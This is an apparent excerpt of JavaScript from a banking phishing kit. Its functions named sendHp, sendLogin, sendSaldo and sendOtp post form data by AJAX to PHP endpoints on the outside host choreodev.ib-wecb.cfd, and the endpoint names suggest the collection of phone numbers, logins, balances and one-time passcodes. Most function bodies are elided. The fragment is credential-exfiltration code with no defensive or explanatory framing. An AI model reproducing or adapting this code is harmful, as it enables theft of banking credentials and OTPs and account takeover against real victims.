function sendHp() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://choreodev.ib-wecb.cfd/12/otpblm.php',
      type: 'POST',
